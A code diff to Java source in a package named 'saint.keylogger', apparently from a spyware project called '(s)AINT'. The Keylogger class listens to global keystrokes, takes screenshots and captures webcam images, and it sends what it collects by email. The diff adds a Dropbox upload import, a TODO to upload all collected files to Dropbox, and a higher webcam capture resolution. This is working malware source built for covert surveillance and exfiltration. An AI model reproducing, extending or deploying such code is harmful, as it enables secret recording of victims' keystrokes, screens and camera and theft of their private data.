@@ -26,6 +26,7 @@
 package saint.keylogger;
 
 import saint.email.SendEmail;
+import saint.dropbox.UploadDropBox;
 import saint.screenshot.Screenshot;
 import saint.webcam.Cam;
 import java.io.BufferedWriter;
@@ -68,8 +69,8 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
     private static String email_to = "email@gmail.com";
     private static String subject = "(s)AINT";
     private static String port = "";
-    private static int cam_width = 640;
-    private static int cam_height = 480;
+    private static int cam_width = 1280;//640;
+    private static int cam_height = 720;//480;
     private static int count = countNumber;
     private static int count_state = 0;
     private static boolean ssl = true;
@@ -191,7 +192,10 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
             nameFileScreenshot = dateFormatHour.format(new Date()).toString();
             Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));
 
-            nameFileCam = dateFormatHour.format(new Date()).toString();
+            //TODO
+            //Collect all the files and uploaded to Dropbox
+            //Removed Cam.Capture(...)
+            nameFileCam = dateFormatHour.format(new Date()).toString();            
             Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);
 
         } catch (Exception ex) {
